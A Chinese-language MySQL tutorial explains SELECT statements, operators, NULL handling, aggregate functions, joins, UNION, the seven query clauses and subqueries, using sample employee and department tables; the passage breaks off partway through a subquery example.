因为查询语句使用的非常的频繁，所以很多人把查询语句单拎出来一类，DQL（数据查询语言），DR（获取）L。\nSELECT语句 SELECT语句是用于查看计算结果、或者查看从数据表中筛选出的数据的。\nSELECT语句的基本语法：\n1 2 3 SELECT 常量; SELECT 表达式; SELECT 函数; for instance:\n1 2 3 SELECT 1; SELECT 9/2; SELECT NOW(); 如果要从数据表中筛选数据，需要加FROM子句。FROM指定数据来源。字段列表筛选列。\n1 SELECT 字段列表 FROM 表名称; 如果要从数据表中根据条件筛选数据，需要加FROM和WHERE子句。WHERE筛选行。\n1 SELECT 字段列表 FROM 表名称 WHERE 条件; 完整的SELECT语句后面可以跟7个子句，后面会逐一讲解。\n使用别名 在当前select语句中给某个字段或表达式计算结果，或表等取个临时名称，便于当前select语句的编写和理解。这个临时名称称为别名。\n1 select 字段名1 as \u0026#34;别名1\u0026#34;, 字段名2 as \u0026#34;别名2\u0026#34; from 表名称 as 别名; 列的别名有空格时，请加双引号。列的别名中没有空格时，双引号可以加也可以不加。 表的别名不能加双引号，表的别名中间不能包含空格。 as大小写都可以，as也完全可以省略。 1 mysql\u0026gt; select * from student; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 +------+------+ | id | name | +------+------+ | 1 | 张三 | | 2 | 李四 | +------+------+ 2 rows in set (0.00 sec) mysql\u0026gt; select id \u0026#34;学号\u0026#34;,name \u0026#34;姓名\u0026#34; from student; +------+------+ | 学号 | 姓名 | +------+------+ | 1 | 张三 | | 2 | 李四 | +------+------+ 2 rows in set (0.00 sec) mysql\u0026gt; select id 学号,name 姓名 from student; +------+------+ | 学号 | 姓名 | +------+------+ | 1 | 张三 | | 2 | 李四 | +------+------+ 2 rows in set (0.00 sec) #查询薪资高于15000的员工姓名和薪资 select ename,salary from t_employee where salary\u0026gt;15000; mysql\u0026gt; select ename,salary from t_employee where salary\u0026gt;15000; +--------+--------+ | ename | salary | +--------+--------+ | 孙洪亮 | 28000 | | 贾宝玉 | 15700 | | 黄冰茹 | 15678 | | 李冰冰 | 18760 | | 谢吉娜 | 18978 | | 舒淇格 | 16788 | | 章嘉怡 | 15099 | +--------+--------+ 7 rows in set (0.00 sec) #查询薪资正好是9000的员工姓名和薪资 select ename,salary from t_employee where salary = 9000; select ename,salary from t_employee where salary == 9000;#错误，不支持== #注意Java中判断用==，mysql判断用= mysql\u0026gt; select ename,salary from t_employee where salary == 9000; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;== 9000\u0026#39; at line 1 #查询籍贯native_place不是北京的 select * from t_employee where native_place != \u0026#39;北京\u0026#39;; select * from t_employee where native_place \u0026lt;\u0026gt; \u0026#39;北京\u0026#39;; #查询员工表中部门编号不是1 select * from t_employee where did != 1; select * from t_employee where did \u0026lt;\u0026gt; 1; #查询奖金比例是NULL select * from t_employee where commission_pct = null; mysql\u0026gt; select * from t_employee where commission_pct = null; #无法用=null判断 Empty set (0.00 sec) #mysql中只要有null值参与运算和比较，结果就是null，底层就是0，表示条件不成立。 #查询奖金比例是NULL select * from t_employee where commission_pct \u0026lt;=\u0026gt; null; select * from t_employee where commission_pct is null; #查询“李冰冰”、“周旭飞”、“李易峰”这几个员工的信息 select * from t_employee where ename in (\u0026#39;李冰冰\u0026#39;,\u0026#39;周旭飞\u0026#39;,\u0026#39;李易峰\u0026#39;); #查询部门编号为2、3的员工信息 select * from t_employee where did in(2,3); #查询部门编号不是2、3的员工信息 select * from t_employee where did not in(2,3); #查询薪资在[10000,15000]之间 select * from t_employee where salary between 10000 and 15000; #查询姓名中第二个字是\u0026#39;冰\u0026#39;的员工 select * from t_employee where ename like \u0026#39;冰\u0026#39;; #这么写等价于 ename=\u0026#39;冰\u0026#39; select * from t_employee where ename like \u0026#39;_冰%\u0026#39;; #这么写匹配的是第二个字是冰，后面可能没有第三个字，或者有好几个字 update t_employee set ename = \u0026#39;王冰\u0026#39; where ename = \u0026#39;李冰冰\u0026#39;; select * from t_employee where ename like \u0026#39;_冰_\u0026#39;; #这么写匹配的是第二个字是冰，后面有第三个字，且只有三个字 #查询员工的姓名、薪资、奖金比例、实发工资 #实发工资 = 薪资 + 薪资 * 奖金比例 select ename as 姓名, salary as 薪资, commission_pct as 奖金比例, salary + salary * commission_pct as 实发工资 from t_employee; #NULL在mysql中比较和计算都有特殊性，所有的计算遇到的null都是null。 #实发工资 = 薪资 + 薪资 * 奖金比例 select ename as 姓名, salary as 薪资, commission_pct as 奖金比例, salary + salary * ifnull(commission_pct,0) as 实发工资 from t_employee; 区间或集合范围比较运算符（掌握） 1 2 3 4 区间范围：between x and y not between x and y 集合范围：in (x,x,x) not in(x,x,x) 1 2 3 4 5 6 7 8 9 10 11 12 #查询薪资在[10000,15000] select * from t_employee where salary\u0026gt;=10000 \u0026amp;\u0026amp; salary\u0026lt;=15000; select * from t_employee where salary between 10000 and 15000; #查询籍贯在这几个地方的 select * from t_employee where native_place in (\u0026#39;北京\u0026#39;, \u0026#39;浙江\u0026#39;, \u0026#39;江西\u0026#39;); #查询薪资不在[10000,15000] select * from t_employee where salary not between 10000 and 15000; #查询籍贯不在这几个地方的 select * from t_employee where native_place not in (\u0026#39;北京\u0026#39;, \u0026#39;浙江\u0026#39;, \u0026#39;江西\u0026#39;); 模糊匹配比较运算符（掌握） 1 2 3 4 5 6 7 8 9 10 11 #查询名字中包含\u0026#39;冰\u0026#39;字 select * from t_employee where ename like \u0026#39;%冰%\u0026#39;; #查询名字以‘雷\u0026#39;结尾的 select * from t_employee where ename like \u0026#39;%雷\u0026#39;; #查询名字以’李\u0026#39;开头 select * from t_employee where ename like \u0026#39;李%\u0026#39;; #查询名字有冰这个字，但是冰的前面只能有1个字 select * from t_employee where ename like \u0026#39;_冰%\u0026#39;; 1 2 #查询当前mysql数据库的字符集情况 show variables like \u0026#39;%character%\u0026#39;; 逻辑运算符（掌握） 1 2 3 逻辑与：\u0026amp;\u0026amp; 或 and 逻辑或：|| 或 or 逻辑非：! 或 not 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #查询薪资高于15000，并且性别是男的员工 select * from t_employee where salary\u0026gt;15000 and gender=\u0026#39;男\u0026#39;; select * from t_employee where salary\u0026gt;15000 \u0026amp;\u0026amp; gender=\u0026#39;男\u0026#39;; select * from t_employee where salary\u0026gt;15000 \u0026amp; gender=\u0026#39;男\u0026#39;;#错误 \u0026amp;按位与 select * from t_employee where (salary\u0026gt;15000) \u0026amp; (gender=\u0026#39;男\u0026#39;); #查询薪资高于15000，或者did为1的员工 select * from t_employee where salary\u0026gt;15000 or did = 1; select * from t_employee where salary\u0026gt;15000 || did = 1; #查询薪资不在[15000,20000]范围的 select * from t_employee where salary not between 15000 and 20000; select * from t_employee where !(salary between 15000 and 20000); 关于null值的问题（掌握） 1 2 3 4 5 6 7 #（1）判断时 xx is null xx is not null xx \u0026lt;=\u0026gt; null #(2)计算时 ifnull(xx,代替值) 当xx是null时，用代替值计算 1 2 3 4 5 6 7 #查询奖金比例为null的员工 select * from t_employee where commission_pct = null; #失败 select * from t_employee where commission_pct = NULL; #失败 select * from t_employee where commission_pct = \u0026#39;NULL\u0026#39;; #失败 select * from t_employee where commission_pct is null; #成功 select * from t_employee where commission_pct \u0026lt;=\u0026gt; null; #成功 \u0026lt;=\u0026gt;安全等于 1 2 3 4 5 6 #查询员工的实发工资，实发工资 = 薪资 + 薪资 * 奖金比例 select ename , salary + salary * commission_pct \u0026#34;实发工资\u0026#34; from t_employee; #失败， 当commission_pct为null，结果都为null select ename ,salary , commission_pct, salary + salary * ifnull(commission_pct,0) \u0026#34;实发工资\u0026#34; from t_employee; 系统预定义函数 函数：代表一个独立的可复用的功能。\n和Java中的方法有所不同，不同点在于：MySQL中的函数必须有返回值，参数可以有可以没有。\nMySQL中函数分为：\n（1）系统预定义函数：MySQL数据库管理软件给我提供好的函数，直接用就可以，任何数据库都可以用公共的函数。\n分组函数：或者又称为聚合函数，多行函数，表示会对表中的多行记录一起做一个“运算”，得到一个结果。求平均值的avg，求最大值的max，求最小值的min，求总和sum，求个数的count等。\n单行函数：表示会对表中的每一行记录分别计算，有n行得到还是n行结果。数学函数、字符串函数、日期时间函数、条件判断函数、窗口函数等。\n（2）用户自定义函数：由开发人员自己定义的，通过CREATE FUNCTION语句定义，是属于某个数据库的对象。\n分组函数 调用完函数后，结果的行数变少了，可能得到一行，可能得到少数几行。\n分组函数有合并计算过程。\n常用分组函数类型\nAVG(x) ：求平均值 SUM(x)：求总和 MAX(x) ：求最大值 MIN(x) ：求最小值 COUNT(x) ：统计记录数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #演示分组函数，聚合函数，多行函数 #统计t_employee表的员工的数量 SELECT COUNT(*) FROM t_employee; SELECT COUNT(1) FROM t_employee; SELECT COUNT(eid) FROM t_employee; SELECT COUNT(commission_pct) FROM t_employee; /* count(*)或count(常量值)：都是统计实际的行数。 count(字段/表达式)：只统计“字段/表达式”部分非NULL值的行数。 */ #找出t_employee表中最高的薪资值 SELECT MAX(salary) FROM t_employee; #找出t_employee表中最低的薪资值 SELECT MIN(salary) FROM t_employee; #统计t_employee表中平均薪资值 SELECT AVG(salary) FROM t_employee; #统计所有人的薪资总和，财务想看一下，一个月要准备多少钱发工资 SELECT SUM(salary) FROM t_employee; #没有考虑奖金 SELECT SUM(salary+salary*IFNULL(commission_pct,0)) FROM t_employee; #找出年龄最小、最大的员工的出生日期 SELECT MAX(birthday),MIN(birthday) FROM t_employee; #查询最新入职的员工的入职日期 SELECT MAX(hiredate) FROM t_employee; 关联查询（联合查询） 关联查询：两个或更多个表一起查询。\n前提条件：这些一起查询的表之间是有关系的（一对一、一对多），它们之间一定是有关联字段，这个关联字段可能建立了外键，也可能没有建立外键。\n比如：员工表和部门表，这两个表依靠“部门编号”进行关联。\n关联查询分为几种情况 关联查询的SQL有几种情况 1、内连接：inner join \u0026hellip; on\n结果：A表 ∩ B表\n2、左连接：A left join B on\n（2）A表全部\n（3）A表- A∩B\n3、右连接：A right join B on\n（4）B表全部\n（5）B表-A∩B\n4、全外连接：full outer join \u0026hellip; on，但是mysql不支持这个关键字，mysql使用union（合并）结果的方式代替\n（6）A表∪B表： （2） A表结果 union （4）B表的结果\n（7）A∪B - A∩B （3）A表- A∩B结果 union （5）B表-A∩B结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /* （1）凡是联合查询的两个表，必须有“关联字段”， 关联字段是逻辑意义一样，数据类型一样，名字可以一样也可以不一样的两个字段。 比如：t_employee （A表）中did和t_department（B表）中的did。 发现关联字段其实就是“可以”建外键的字段。当然联合查询不要求一定建外键。 （2）联合查询必须写关联条件，关联条件的个数 = n - 1. n是联合查询的表的数量。 如果2个表一起联合查询，关联条件数量是1， 如果3个表一起联合查询，关联条件数量是2， 如果4个表一起联合查询，关联条件数量是3， 。。。。 否则就会出现笛卡尔积现象，这是应该避免的。 （3）关联条件可以用on子句编写，也可以写到where中。 但是建议用on单独编写，这样呢，可读性更好。 每一个join后面都要加on子句 A inner|left|right join B on 条件 A inner|left|right join B on 条件 inner|left|right jon C on 条件。 内连接 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 #演示内连接，结果是A∩B /* 观察数据： t_employee 看成A表 t_department 看成B表 此时t_employee （A表）中有 李红和周洲的did是NULL，没有对应部门， t_department（B表）中有 测试部，在员工表中找不到对应记录的。 */ #查询所有员工的姓名，部门编号，部门名称 #如果员工没有部门的，不要 #如果部门没有员工的，不要 /* 员工的姓名在t_employee （A表）中 部门的编号，在t_employee （A表）和t_department（B表）都有 部门名称在t_department（B表）中 所以需要联合两个表一起查询。 */ SELECT ename,did,dname FROM t_employee INNER JOIN t_department; #错误Column \u0026#39;did\u0026#39; in field list is ambiguous #因为did在两个表中都有，名字相同，它不知道取哪个表中字段了 #有同学说，它俩都是部门编号，随便取一个不就可以吗？ #mysql不这么认为，有可能存在两个表都有did，但是did的意义不同的情况。 #为了避免这种情况，需要在编写sql的时候，明确指出是用哪个表的did SELECT ename,t_department.did,dname FROM t_employee INNER JOIN t_department; #语法对，结果不太对 #结果出现“笛卡尔积”现象， A表记录 * B表记录 /* （1）凡是联合查询的两个表，必须有“关联字段”， 关联字段是逻辑意义一样，数据类型一样，名字可以一样也可以不一样的两个字段。 比如：t_employee （A表）中did和t_department（B表）中的did。 发现关联字段其实就是可以建外键的字段。当然联合查询不要求一定建外键。 （2）联合查询必须写关联条件，关联条件的个数 = n - 1。 n是联合查询的表的数量。 如果2个表一起联合查询，关联条件数量是1， 如果3个表一起联合查询，关联条件数量是2， 如果4个表一起联合查询，关联条件数量是3， 。。。。 否则就会出现笛卡尔积现象，这是应该避免的。 （3）关联条件可以用on子句编写，也可以写到where中。 但是建议用on单独编写，这样呢，可读性更好。 每一个join后面都要加on子句 A inner|left|right join B on 条件 A inner|left|right join B on 条件 inner|left|right jon C on 条件 */ SELECT ename,t_department.did,dname FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did; SELECT * FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did; #查询部门编号为1的女员工的姓名、部门编号、部门名称、薪资等情况 SELECT ename,gender,t_department.did,dname,salary FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did WHERE t_department.did = 1 AND gender = \u0026#39;女\u0026#39;; #查询部门编号为1的员工姓名、部门编号、部门名称、薪资、职位编号、职位名称等情况 SELECT ename,gender,t_department.did,dname,salary,job_id,jname FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did INNER JOIN t_job ON t_employee.`job_id` = t_job.`jid` WHERE t_department.did = 1; 左连接 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #演示左连接 /* (2)A （3）A-A∩B */ /* 观察数据： t_employee 看成A表 t_department 看成B表 此时t_employee （A表）中有 李红和周洲的did是NULL，没有对应部门， t_department（B表）中有 测试部，在员工表中找不到对应记录的。 */ #查询所有员工，包括没有指定部门的员工，他们的姓名、薪资、部门编号、部门名称 SELECT ename,salary,t_department.did,dname FROM t_employee LEFT JOIN t_department ON t_employee.did = t_department.did; #查询的是A结果 A left join B #查询没有部门的员工信息 SELECT ename,salary,t_department.did,dname FROM t_employee LEFT JOIN t_department ON t_employee.did = t_department.did WHERE t_employee.did IS NULL; #查询的结果是A - A∩B #此时的where条件，建议写子表的关联字段is null，这样更准确一点。 #如果要建外键，它们肯定有子表和父表的角色，写子表的关联字段is null #因为父表中这个字段一般是主键，不会为null。 右连接 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /* 右连接 （4）B （5）B - A∩B */ #演示右连接 /* 观察数据： t_employee 看成A表 t_department 看成B表 此时t_employee （A表）中有 李红和周洲的did是NULL，没有对应部门， t_department（B表）中有 测试部，在员工表中找不到对应记录的。 */ #查询所有部门，包括没有对应员工的部门，他们的姓名、薪资、部门编号、部门名称 SELECT ename,salary,t_department.did,dname FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did; #查询的是B结果 A RIGHT join B #查询没有员工部门的信息 SELECT ename,salary,t_department.did,dname FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did WHERE t_employee.did IS NULL; #查询的结果是B - A∩B #此时的where条件，建议写子表的关联字段is null，这样更准确一点。 #如果要建外键，它们肯定有子表和父表的角色，写子表的关联字段is null #因为父表中这个字段一般是主键，不会为null。 #查询所有员工，包括没有指定部门的员工，他们的姓名、薪资、部门编号、部门名称 SELECT ename,salary,t_department.did,dname FROM t_department RIGHT JOIN t_employee ON t_employee.did = t_department.did; #查询的是B结果 A RIGHT join B #查询没有部门的员工信息 SELECT ename,salary,t_department.did,dname FROM t_department RIGHT JOIN t_employee ON t_employee.did = t_department.did WHERE t_employee.did IS NULL; #查询的结果是B - A∩B A right join B #此时的where条件，建议写子表的关联字段is null，这样更准确一点。 #如果要建外键，它们肯定有子表和父表的角色，写子表的关联字段is null #因为父表中这个字段一般是主键，不会为null。 union 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 /* union实现 （6）A∪B （7）A∪B - A∩B A-A∩B ∪ B-A∩B */ #演示用union合并两个查询结果实现A∪B 和A∪B - A∩B /* union合并时要注意： （1）两个表要查询的结果字段是一样的 （2）UNION ALL表示直接合并结果，如果有重复的记录一并显示 ALL去掉表示合并结果时，如果有重复记录，去掉。 （3）要实现A∪B的结果，那么必须是合并 查询是A表结果和查询是B表结果的select语句。 同样要实现A∪B - A∩B的结果，那么必须是合并查询是A-A∩B结果和查询是B-A∩B的select语句。 */ #查询所有员工和所有部门，包括没有指定部门的员工和没有分配员工的部门。 SELECT * FROM t_employee LEFT JOIN t_department ON t_employee.did = t_department.did UNION SELECT * FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did; #以下union会报错 SELECT * FROM t_employee UNION SELECT * FROM t_department; /* 错误代码： 1222 The used SELECT statements have a different number of columns 两个Select语句的列数是不同的。 column：列，表中的字段。 columns：很多的字段，即字段列表 select 字段列表 from 表名称; */ #联合 查询结果是A表的select 和查询结果是A∩B的select语句，是得不到A∪B SELECT * FROM t_employee LEFT JOIN t_department ON t_employee.did = t_department.did UNION SELECT * FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did; #查询那些没有分配部门的员工和没有指定员工的部门，即A表和B表在对方那里找不到对应记录的数据。 SELECT * FROM t_employee LEFT JOIN t_department ON t_employee.did = t_department.did WHERE t_employee.did IS NULL UNION SELECT * FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did WHERE t_employee.did IS NULL; 联合查询字段连表问题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #查询字段的问题 #查询每一个员工及其所在部门的信息 #要求：显示员工的编号，姓名，部门编号，部门名称 SELECT eid,ename,did,dname FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did; /* 错误代码： 1052 Column \u0026#39;did\u0026#39; in field list is ambiguous（模糊不清的；引起歧义的） */ SELECT eid,ename,t_employee.did,dname FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did; #查询每一个员工及其所在部门的信息 #要求，显示员工的编号，姓名，部门表的所有字段 SELECT eid,ename,t_department.* FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did; select的七大子句 大字句顺序\n（1）from：从哪些表中筛选\n（2）on：关联多表查询时，去除笛卡尔积\n（3）where：从表中筛选的条件\n（4）group by：分组依据\n（5）having：在统计结果中再次筛选（with rollup)\n（6）order by：排序\n（7）limit：分页\n必须按照（1）-（7）的顺序编写子句。\nfrom子句 1 2 3 #1、from子句 SELECT * FROM t_employee; #表示从某个表中筛选数据 on子句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #2、on子句 /* （1）on必须配合join使用 （2）on后面只写关联条件 所谓关联条件是两个表的关联字段的关系 （3）有n张表关联，就有n-1个关联条件 两张表关联，就有1个关联条件 三张表关联，就有2个关联条件 */ SELECT * FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did; #1个关联条件 #查询员工的编号，姓名，职位编号，职位名称，部门编号，部门名称 #需要t_employee员工表，t_department部门表，t_job职位表 SELECT eid,ename,t_job.job_id,t_job.job_name, `t_department`.`did`,`t_department`.`dname` FROM t_employee INNER JOIN t_department INNER JOIN t_job ON t_employee.did = t_department.did AND t_employee.job_id = t_job.job_id; where子句 1 2 3 4 5 6 #3、where子句，在查询结果中筛选 #查询女员工的信息，以及女员工的部门信息 SELECT * FROM t_employee INNER JOIN t_department ON t_employee.did = t_department.did WHERE gender = \u0026#39;女\u0026#39;; group by子句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #4、group by分组 #查询所有员工的平均薪资 SELECT AVG(salary) FROM t_employee; #查询每一个部门的平均薪资 SELECT did,ROUND(AVG(salary),2 ) FROM t_employee GROUP BY did; #查询每一个部门的平均薪资，显示部门编号，部门的名称，该部门的平均薪资 SELECT t_department.did,dname,ROUND(AVG(salary),2 ) FROM t_department LEFT JOIN t_employee ON t_department.did = t_employee.did GROUP BY t_department.did; #查询每一个部门的平均薪资，显示部门编号，部门的名称，该部门的平均薪资 #要求，如果没有员工的部门，平均薪资不显示null，显示0 SELECT t_department.did,dname,IFNULL(ROUND(AVG(salary),2),0) FROM t_department LEFT JOIN t_employee ON t_department.did = t_employee.did GROUP BY t_department.did; #查询每一个部门的女员工的平均薪资，显示部门编号，部门的名称，该部门的平均薪资 #要求，如果没有员工的部门，平均薪资不显示null，显示0 SELECT t_department.did,dname,IFNULL(ROUND(AVG(salary),2),0) FROM t_department LEFT JOIN t_employee ON t_department.did = t_employee.did WHERE gender = \u0026#39;女\u0026#39; GROUP BY t_department.did; 问题1：合计，WITH ROLLUP，加在group by后面 1 2 3 4 5 6 7 8 #问题1：合计，WITH ROLLUP，加在group by后面 #按照部门统计人数 SELECT did, COUNT(*) FROM t_employee GROUP BY did; #按照部门统计人数，并合计总数 SELECT did, COUNT(*) FROM t_employee GROUP BY did WITH ROLLUP; SELECT IFNULL(did,\u0026#39;合计\u0026#39;), COUNT(*) FROM t_employee GROUP BY did WITH ROLLUP; SELECT IFNULL(did,\u0026#39;合计\u0026#39;) AS \u0026#34;部门编号\u0026#34; , COUNT(*) AS \u0026#34;人数\u0026#34; FROM t_employee GROUP BY did WITH ROLLUP; 问题2：是否可以按照多个字段分组统计 1 2 3 4 5 #问题2：是否可以按照多个字段分组统计 #按照不同的部门，不同的职位，分别统计男和女的员工人数 SELECT did, job_id, gender, COUNT(*) FROM t_employee GROUP BY did, job_id, gender; 问题3：分组统计时，select后面字段列表的问题 1 2 3 4 5 6 7 8 9 #问题3：分组统计时，select后面字段列表的问题 SELECT eid,ename, did, COUNT(*) FROM t_employee; #eid,ename, did此时和count(*)，不应该出现在select后面 SELECT eid,ename, did, COUNT(*) FROM t_employee GROUP BY did; #eid,ename此时和count(*)，不应该出现在select后面 SELECT did, COUNT(*) FROM t_employee GROUP BY did; #分组统计时，select后面只写和分组统计有关的字段，其他无关字段不要出现，否则会引起歧义 having子句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #5、having /* having子句也写条件 where的条件是针对原表中的记录的筛选。where后面不能出现分组函数。 having子句是对统计结果（分组函数计算后）的筛选。having可以加分组函数。 */ #查询每一个部门的女员工的平均薪资，显示部门编号，部门的名称，该部门的平均薪资 #要求，如果没有员工的部门，平均薪资不显示null，显示0 #最后只显示平均薪资高于12000的部门信息 SELECT t_department.did,dname,IFNULL(ROUND(AVG(salary),2),0) FROM t_department LEFT JOIN t_employee ON t_department.did = t_employee.did WHERE gender = \u0026#39;女\u0026#39; GROUP BY t_department.did HAVING IFNULL(ROUND(AVG(salary),2),0) \u0026gt;12000; #查询每一个部门的男和女员工的人数 SELECT did,gender,COUNT(*) FROM t_employee GROUP BY did,gender; #查询每一个部门的男和女员工的人数，显示部门编号，部门的名称，性别，人数 SELECT t_department.did,dname,gender,COUNT(eid) FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did GROUP BY t_department.did,gender; #查询每一个部门薪资超过10000的男和女员工的人数，显示部门编号，部门的名称，性别，人数 #只显示人数低于3人 SELECT t_department.did,dname,gender,COUNT(eid) FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did WHERE salary \u0026gt; 10000 GROUP BY t_department.did,gender HAVING COUNT(eid) \u0026lt; 3; order by子句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #6、排序 order by /* 升序和降序，默认是升序 asc代表升序 desc 代表降序 */ #查询员工信息，按照薪资从高到低 SELECT * FROM t_employee ORDER BY salary DESC; #查询每一个部门薪资超过10000的男和女员工的人数，显示部门编号，部门的名称，性别，人数 #只显示人数低于3人，按照人数升序排列 SELECT t_department.did,dname,gender,COUNT(eid) FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did WHERE salary \u0026gt; 10000 GROUP BY t_department.did,gender HAVING COUNT(eid) \u0026lt; 3 ORDER BY COUNT(eid); #查询员工的薪资，按照薪资从低到高，薪资相同按照员工编号从高到低 SELECT * FROM t_employee ORDER BY salary ASC , eid DESC; limit子句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #演示limit子句 /* limit子句是用于分页显示结果。 limit m,n n：表示最多该页显示几行 m：表示从第几行开始取记录，第一个行的索引是0 m = (page-1)*n page表示第几页 每页最多显示5条，n=5 第1页，page=1，m = (1-1)*5 = 0; limit 0,5 第2页，page=2，m = (2-1)*5 = 5; limit 5,5 第3页，page=3，m = (3-1)*5 = 10; limit 10,5 */ #查询员工表的数据，分页显示，每页显示5条记录 #第1页 SELECT * FROM t_employee LIMIT 0,5; #第2页 SELECT * FROM t_employee LIMIT 5,5; #第3页 SELECT * FROM t_employee LIMIT 10,5; #第4页 SELECT * FROM t_employee LIMIT 15,5; #第5页 SELECT * FROM t_employee LIMIT 20,5; #第6页 SELECT * FROM t_employee LIMIT 25,5; #查询所有的男员工信息，分页显示，每页显示3条，第2页 #limit m,n n=3,page=2,m=(page-1)*n=3 SELECT * FROM t_employee WHERE gender =\u0026#39;男\u0026#39; LIMIT 3,3 #查询每一个编号为偶数的部门，显示部门编号，名称，员工数量， #只显示员工数量\u0026gt;=2的结果，按照员工数量升序排列， #每页显示2条，显示第1页 SELECT t_department.did,dname,COUNT(eid) FROM t_employee RIGHT JOIN t_department ON t_employee.did = t_department.did WHERE t_department.did%2=0 GROUP BY t_department.did HAVING COUNT(eid)\u0026gt;=2 ORDER BY COUNT(eid) LIMIT 0,2; 子查询 SELECT的SELECT中嵌套子查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* 子查询：嵌套在另一个SQL语句中的查询。 SELECT语句可以嵌套在另一个SELECT中，UPDATE，DELETE，INSERT，CREATE语句等。 (1)SELECT的SELECT中嵌套子查询 */ #（1）在“t_employee”表中查询每个人薪资和公司平均薪资的差值， #并显示员工薪资和公司平均薪资相差5000元以上的记录。 SELECT ename AS \u0026#34;姓名\u0026#34;, salary AS \u0026#34;薪资\u0026#34;, ROUND((SELECT AVG(salary) FROM t_employee),2) AS \u0026#34;全公司平均薪资\u0026#34;, ROUND(salary-(SELECT AVG(salary) FROM t_employee),2) AS \u0026#34;差值\u0026#34; FROM t_employee WHERE ABS(ROUND(salary-(SELECT AVG(salary) FROM t_employee),2))\u0026gt;5000; #（2）在“t_employee”表中查询每个部门平均薪资和公司平均薪资的差值。 SELECT did,AVG(salary), AVG(salary)-(SELECT AVG(salary) FROM t_employee) FROM t_employee GROUP BY did; SELECT的WHERE或HAVING中嵌套子查询 当子查询结果作为外层另一个SQL的过滤条件，通常把子查询嵌入到WHERE或HAVING中。根据子查询结果的情况，分为如下三种情况。\n当子查询的结果是单列单个值，那么可以直接使用比较运算符，如“\u0026lt;”、“\u0026lt;=”、“\u0026gt;”、“\u0026gt;=”、“=”、“!=”等与子查询结果进行比较。 当子查询的结果是单列多个值，那么可以使用比较运算符IN或NOT IN进行比较。 当子查询的结果是单列多个值，还可以使用比较运算符, 如“\u0026lt;”、“\u0026lt;=”、“\u0026gt;”、“\u0026gt;=”、“=”、“!=”等搭配ANY、SOME、ALL等关键字与查询结果进行比较。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /* 子查询嵌套在where后面。 在where或having后面的子查询结果是： （1）单个值，那么可以用=，\u0026gt;,\u0026lt;,\u0026gt;=,\u0026lt;=,!=这样的运算符和子查询的结果做比较 （2）多个值，那么需要用in,not in, \u0026gt;all,\u0026gt;any....形式做比较 如“\u0026lt;”、“\u0026lt;=”、“\u0026gt;”、“\u0026gt;=”、“=”、“!=”等搭配ANY、SOME、ALL等关键字与查询结果进行比较 */ #（1）在“t_employee”表中查询薪资最高的员工姓名（ename）和薪资（salary）。 #SELECT ename,MAX(salary) FROM t_employee;#错误 #取表中第一行员工的姓名和全公司最高的薪资值一起显示。 SELECT ename,salary FROM t_employee WHERE salary = (SELECT MAX(salary) FROM t_employee); #（2）在“t_employee”表中查询比全公司平均薪资高的男员工姓名和薪资。 SELECT ename,salary FROM t_employee WHERE salary \u0026gt; (SELECT AVG(salary) FROM t_employee) AND gender = \u0026#39;男\u0026#39;; #（3）在“t_employee”表中查询和“白露”，“谢吉娜”同一部门的员工姓名和电话。 SELECT ename,tel,did FROM t_employee WHERE did IN(SELECT did FROM t_employee WHERE ename=\u0026#39;白露\u0026#39; || 